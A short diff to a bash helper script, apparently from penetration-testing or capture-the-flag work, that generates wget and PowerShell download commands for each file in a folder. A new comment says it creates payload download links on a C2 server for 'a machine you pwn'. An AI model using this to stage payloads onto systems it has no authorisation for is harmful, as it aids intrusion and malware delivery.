@@ -1,6 +1,8 @@
 #!/bin/bash
 
 # Run in the current directory and you will get a wget command (for Linux) and an iwr command (for PowerShell) for each file, to use on a machine you pwn.
+# Useful for creating payload download links on a C2 server.
+
 
 # One liner
 # IP_ADDRESS=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}') && [ -n "$IP_ADDRESS" ] && for file in *; do [ -f "$file" ] && echo "wget http://$IP_ADDRESS/$file"; done && for file in *; do [ -f "$file" ] && echo "iwr -Uri http://$IP_ADDRESS/$file -OutFile $file"; done
